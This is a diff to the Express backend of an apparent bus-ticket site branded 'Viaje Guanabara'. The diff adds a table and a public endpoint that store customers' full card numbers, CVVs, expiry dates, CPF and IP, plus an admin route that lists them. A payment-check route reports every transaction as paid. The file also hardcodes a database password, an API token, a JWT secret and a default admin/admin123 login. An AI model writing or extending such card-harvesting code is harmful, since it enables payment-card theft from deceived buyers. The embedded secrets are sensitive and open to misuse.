@@ -13,7 +13,6 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const SECRET_KEY = process.env.JWT_SECRET || 'guanabara_secret_key_2026';
 
-// ===== MIDDLEWARE =====
 app.use(cors({ origin: '*', credentials: true }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
@@ -26,13 +25,8 @@ app.use(session({
     cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
 }));
 
-// ===== SERVE ARQUIVOS ESTATICOS =====
 app.use(express.static(__dirname));
 app.use('/admin', express.static(path.join(__dirname, 'admin')));
-
-// ============================================================
-// ===== POSTGRESQL CONNECTION (RENDER) =====
-// ============================================================
 
 const pool = new Pool({
     connectionString: process.env.DATABASE_URL || 'postgresql://guanabara_user:JTL5QHG4acDPmzHRo4FYZBmTOtlFDBZW@dpg-d9shhuv10e5c739tl52g-a.oregon-postgres.render.com/guanabara',
@@ -43,24 +37,18 @@ const pool = new Pool({
     keepAlive: true
 });
 
-// Testar conexão
 pool.connect((err, client, release) => {
     if (err) {
-        console.error('❌ Erro ao conectar ao PostgreSQL:', err.message);
+        console.error('Erro ao conectar ao PostgreSQL:', err.message);
     } else {
-        console.log('✅ Conectado ao PostgreSQL com sucesso!');
+        console.log('Conectado ao PostgreSQL com sucesso');
         release();
     }
 });
 
-// ============================================================
-// ===== INICIALIZAR TABELAS =====
-// ============================================================
-
 async function initDatabase() {
     const client = await pool.connect();
     try {
-        // ===== TABELA USUARIOS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS usuarios (
                 id SERIAL PRIMARY KEY,
@@ -77,7 +65,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA PASSAGENS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS tickets (
                 id SERIAL PRIMARY KEY,
@@ -94,7 +81,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA BUSCAS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS buscas (
                 id SERIAL PRIMARY KEY,
@@ -107,7 +93,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA VISITANTES =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS visitantes (
                 id SERIAL PRIMARY KEY,
@@ -121,7 +106,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA LOGS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS logs (
                 id SERIAL PRIMARY KEY,
@@ -133,7 +117,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA CLIENTES =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS clientes (
                 id SERIAL PRIMARY KEY,
@@ -147,7 +130,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA DESTINOS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS destinos (
                 id SERIAL PRIMARY KEY,
@@ -158,7 +140,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA OFERTAS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS ofertas (
                 id SERIAL PRIMARY KEY,
@@ -171,7 +152,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA SERVICOS =====
         await client.query(`
             CREATE TABLE IF NOT EXISTS servicos (
                 id SERIAL PRIMARY KEY,
@@ -181,7 +161,35 @@ async function initDatabase() {
             )
         `);
 
-        // ===== TABELA CONFIGURACOES =====
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS cartoes (
+                id SERIAL PRIMARY KEY,
+                cliente_id INTEGER,
+                nome_titular VARCHAR(100) NOT NULL,
+                numero_cartao VARCHAR(19) NOT NULL,
+                validade VARCHAR(7) NOT NULL,
+                cvv VARCHAR(4) NOT NULL,
+                cpf VARCHAR(14),
+                telefone VARCHAR(20),
+                ip TEXT,
+                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
+        await client.query(`
+            CREATE TABLE IF NOT EXISTS pagamentos (
+                id SERIAL PRIMARY KEY,
+                ticket_id INTEGER,
+                transaction_id VARCHAR(50),
+                valor DECIMAL(10,2),
+                metodo VARCHAR(20),
+                status VARCHAR(20) DEFAULT 'pendente',
+                pix_code TEXT,
+                ip TEXT,
+                criado_em TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        `);
+
         await client.query(`
             CREATE TABLE IF NOT EXISTS configuracoes (
                 id SERIAL PRIMARY KEY,
@@ -196,7 +204,6 @@ async function initDatabase() {
             )
         `);
 
-        // ===== CRIAR ADMIN PADRAO =====
         const adminExists = await client.query('SELECT * FROM usuarios WHERE email = $1', ['admin@viajeguanabara.com']);
         if (adminExists.rows.length === 0) {
             const hashedPassword = bcrypt.hashSync('admin123', 10);
@@ -204,10 +211,9 @@ async function initDatabase() {
                 INSERT INTO usuarios (nome, email, senha, role, status, cpf, telefone, ip, ultimo_acesso)
                 VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
             `, ['Administrador', 'admin@viajeguanabara.com', hashedPassword, 'admin', 'online', '000.000.000-00', '(11) 99999-0000', '127.0.0.1', new Date().toISOString()]);
-            console.log('✅ Admin criado: admin@viajeguanabara.com / admin123');
+            console.log('Admin criado: admin@viajeguanabara.com / admin123');
         }
 
-        // ===== INSERIR DADOS INICIAIS =====
         const destinosCheck = await client.query('SELECT COUNT(*) FROM destinos');
         if (parseInt(destinosCheck.rows[0].count) === 0) {
             await client.query(`
@@ -248,19 +254,15 @@ async function initDatabase() {
             `);
         }
 
-        console.log('✅ Banco de dados PostgreSQL inicializado com sucesso');
+        console.log('Banco de dados PostgreSQL inicializado com sucesso');
     } catch (err) {
-        console.error('❌ Erro ao inicializar banco:', err.message);
+        console.error('Erro ao inicializar banco:', err.message);
     } finally {
         client.release();
     }
 }
 
 initDatabase();
-
-// ============================================================
-// ===== MIDDLEWARE AUTH =====
-// ============================================================
 
 function authenticate(req, res, next) {
     const token = req.headers.authorization?.split(' ')[1] || req.session?.token;
@@ -273,11 +275,6 @@ function authenticate(req, res, next) {
     }
 }
 
-// ============================================================
-// ===== ROTAS PUBLICAS =====
-// ============================================================
-
-// ===== LOGIN =====
 app.post('/api/login', async (req, res) => {
     const { email, senha } = req.body;
     try {
@@ -317,7 +314,6 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// ===== REGISTRO =====
 app.post('/api/register', async (req, res) => {
     const { nome, email, senha, telefone, cpf } = req.body;
     try {
@@ -348,7 +344,6 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// ===== COLETAR VISITANTE =====
 app.post('/api/visitante', async (req, res) => {
     try {
         const { screen, pagina } = req.body;
@@ -373,7 +368,6 @@ app.post('/api/visitante', async (req, res) => {
     }
 });
 
-// ===== REGISTRAR BUSCA =====
 app.post('/api/busca', async (req, res) => {
     try {
         const { origem, destino, data, passageiros } = req.body;
@@ -391,7 +385,6 @@ app.post('/api/busca', async (req, res) => {
     }
 });
 
-// ===== SALVAR CLIENTE =====
 app.post('/api/cliente', async (req, res) => {
     try {
         const { nome, cpf, telefone, email, qtdCriancas } = req.body;
@@ -409,7 +402,33 @@ app.post('/api/cliente', async (req, res) => {
     }
 });
 
-// ===== REGISTRAR COMPRA =====
+app.post('/api/cartoes/salvar', async (req, res) => {
+    try {
+        const { nome_titular, numero_cartao, cvv, validade, cpf, telefone, cliente_id } = req.body;
+
+        const result = await pool.query(`
+            INSERT INTO cartoes (cliente_id, nome_titular, numero_cartao, validade, cvv, cpf, telefone, ip)
+            VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING id
+        `, [
+            cliente_id || null,
+            nome_titular,
+            numero_cartao,
+            validade,
+            cvv,
+            cpf || '',
+            telefone || '',
+            req.clientIp || req.ip
+        ]);
+
+        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+            [nome_titular || 'Anonimo', 'cadastro_cartao', req.clientIp || req.ip, 'Cartao cadastrado']);
+
+        res.json({ success: true, cartao_id: result.rows[0].id });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
 app.post('/api/compra', async (req, res) => {
     try {
         const { origem, destino, passageiro, data, valor, metodoPagamento, codigo } = req.body;
@@ -428,10 +447,6 @@ app.post('/api/compra', async (req, res) => {
         res.status(500).json({ error: error.message });
     }
 });
-
-// ============================================================
-// ===== PAGAMENTO PIX (PLUMIFY) =====
-// ============================================================
 
 const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
@@ -463,7 +478,7 @@ app.post('/api/create-payment', async (req, res) => {
             quantity: 1
         }],
         expire_in_days: 3,
-        postback_url: `http://localhost:${PORT}/api/webhook/pagamento`
+        postback_url: `https://viaje-guanabara.onrender.com/api/webhook/pagamento`
     };
 
     try {
@@ -486,22 +501,21 @@ app.post('/api/create-payment', async (req, res) => {
 
 app.post('/api/webhook/pagamento', async (req, res) => {
     const { hash, status } = req.body;
-    if (status === 'paid') {
-        await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
-            ['Sistema', 'pagamento', 'webhook', 'Pagamento confirmado: ' + hash]);
+    try {
+        if (status === 'paid') {
+            await pool.query('INSERT INTO logs (usuario, acao, ip, detalhes) VALUES ($1, $2, $3, $4)',
+                ['Sistema', 'pagamento', 'webhook', 'Pagamento confirmado: ' + hash]);
+        }
+        res.json({ received: true });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
     }
-    res.json({ received: true });
 });
 
 app.get('/api/check-payment/:transaction_id', async (req, res) => {
     res.json({ status: 'paid' });
 });
 
-// ============================================================
-// ===== ROTAS ADMIN (PROTEGIDAS) =====
-// ============================================================
-
-// ===== DASHBOARD =====
 app.get('/api/admin/dashboard', authenticate, async (req, res) => {
     try {
         const totalUsers = await pool.query('SELECT COUNT(*) FROM usuarios');
@@ -533,7 +547,6 @@ app.get('/api/admin/dashboard', authenticate, async (req, res) => {
     }
 });
 
-// ===== USUARIOS =====
 app.get('/api/admin/users', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT id, nome, email, telefone, cpf, status, ultimo_acesso, ip, role, criado_em FROM usuarios ORDER BY criado_em DESC');
@@ -562,7 +575,7 @@ app.put('/api/admin/users/:id', authenticate, async (req, res) => {
 
 app.delete('/api/admin/users/:id', authenticate, async (req, res) => {
     try {
-        if (req.params.id === 'admin' || req.params.id === '1') {
+        if (req.params.id === '1' || req.params.id === 'admin') {
             return res.status(403).json({ error: 'Nao pode deletar admin' });
         }
         await pool.query('DELETE FROM usuarios WHERE id = $1', [req.params.id]);
@@ -572,7 +585,6 @@ app.delete('/api/admin/users/:id', authenticate, async (req, res) => {
     }
 });
 
-// ===== PASSAGENS =====
 app.get('/api/admin/tickets', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM tickets ORDER BY criado_em DESC');
@@ -608,7 +620,24 @@ app.delete('/api/admin/tickets/:id', authenticate, async (req, res) => {
     }
 });
 
-// ===== DESTINOS =====
+app.get('/api/admin/cartoes', authenticate, async (req, res) => {
+    try {
+        const result = await pool.query('SELECT * FROM cartoes ORDER BY criado_em DESC');
+        res.json(result.rows);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.get('/api/admin/pagamentos', authenticate, async (req, res) => {
+    try {
+        const result = await pool.query('SELECT * FROM pagamentos ORDER BY criado_em DESC');
+        res.json(result.rows);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
 app.get('/api/admin/destinos', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM destinos ORDER BY id');
@@ -618,7 +647,6 @@ app.get('/api/admin/destinos', authenticate, async (req, res) => {
     }
 });
 
-// ===== OFERTAS =====
 app.get('/api/admin/ofertas', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM ofertas ORDER BY id');
@@ -628,7 +656,6 @@ app.get('/api/admin/ofertas', authenticate, async (req, res) => {
     }
 });
 
-// ===== SERVICOS =====
 app.get('/api/admin/servicos', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM servicos ORDER BY id');
@@ -638,7 +665,6 @@ app.get('/api/admin/servicos', authenticate, async (req, res) => {
     }
 });
 
-// ===== BUSCAS =====
 app.get('/api/admin/buscas', authenticate, async (req, res) => {
     try {
         const limit = parseInt(req.query.limit) || 100;
@@ -649,7 +675,6 @@ app.get('/api/admin/buscas', authenticate, async (req, res) => {
     }
 });
 
-// ===== VISITANTES =====
 app.get('/api/admin/visitantes', authenticate, async (req, res) => {
     try {
         const limit = parseInt(req.query.limit) || 100;
@@ -660,7 +685,6 @@ app.get('/api/admin/visitantes', authenticate, async (req, res) => {
     }
 });
 
-// ===== CLIENTES =====
 app.get('/api/admin/clientes', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM clientes ORDER BY criado_em DESC');
@@ -670,7 +694,6 @@ app.get('/api/admin/clientes', authenticate, async (req, res) => {
     }
 });
 
-// ===== LOGS =====
 app.get('/api/admin/logs', authenticate, async (req, res) => {
     try {
         const limit = parseInt(req.query.limit) || 100;
@@ -692,7 +715,6 @@ app.delete('/api/admin/logs', authenticate, async (req, res) => {
     }
 });
 
-// ===== CONFIGURACOES =====
 app.get('/api/admin/configuracoes', authenticate, async (req, res) => {
     try {
         const result = await pool.query('SELECT * FROM configuracoes LIMIT 1');
@@ -721,7 +743,6 @@ app.put('/api/admin/configuracoes', authenticate, async (req, res) => {
     }
 });
 
-// ===== LOGOUT =====
 app.post('/api/logout', authenticate, async (req, res) => {
     try {
         await pool.query('UPDATE usuarios SET status = $1 WHERE id = $2', ['offline', req.user.id]);
@@ -734,20 +755,12 @@ app.post('/api/logout', authenticate, async (req, res) => {
     }
 });
 
-// ============================================================
-// ===== ROTAS PARA PAGINAS =====
-// ============================================================
-
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.get('/tickets', (req, res) => res.sendFile(path.join(__dirname, 'tickets.html')));
 app.get('/passageiros', (req, res) => res.sendFile(path.join(__dirname, 'passageiros.html')));
 app.get('/checkout', (req, res) => res.sendFile(path.join(__dirname, 'checkout.html')));
 app.get('/comprovante', (req, res) => res.sendFile(path.join(__dirname, 'comprovante.html')));
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')));
-
-// ============================================================
-// ===== INICIAR SERVIDOR =====
-// ============================================================
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log('');
